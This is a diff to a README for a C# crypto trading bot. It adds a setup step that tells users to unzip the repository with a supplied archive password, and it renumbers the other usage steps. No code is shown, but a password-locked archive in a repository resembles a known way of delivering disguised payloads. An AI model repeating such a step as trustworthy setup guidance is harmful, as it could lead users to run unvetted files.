@@ -46,16 +46,19 @@ Written tool on C# serves a dual purpose by enabling users to strategically part
 
 ## Usage
 
-1. **Run the Bot:**
+1. **Clone the repository**
+   - Clone the repository and unzip the repository with pass `WxoRgpAX0G` to folder.
+     
+3. **Run the Bot:**
    - Execute the bot script.
 
-2. **Monitor Console Output:**
+4. **Monitor Console Output:**
    - Review the console output for transaction details, status, and any potential errors.
 
-3. **Interact with Buy/Sell Buttons:**
+5. **Interact with Buy/Sell Buttons:**
    - Utilize the configured buy and sell buttons to execute trades manually.
 
-4. **Automated Trading:**
+6. **Automated Trading:**
    - Enable the AutoBuy feature for hands-free trading based on predefined criteria.
 
 
